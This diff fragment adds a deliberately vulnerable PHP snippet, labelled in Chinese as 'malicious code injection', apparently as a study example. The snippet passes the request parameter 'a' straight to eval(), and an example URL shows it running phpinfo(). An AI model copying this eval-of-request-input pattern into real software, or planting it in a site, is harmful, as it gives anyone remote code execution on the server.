@@ -35,3 +35,12 @@ try{
 
 
 # php-i
+
+// 恶意代码注入
+// http://xxx.com/index.php?a=phpinfo();
+$a = $_REQUEST['a'];
+dump($a);
+dump(eval($a));
+
+
+//echo pack('H*',706870);
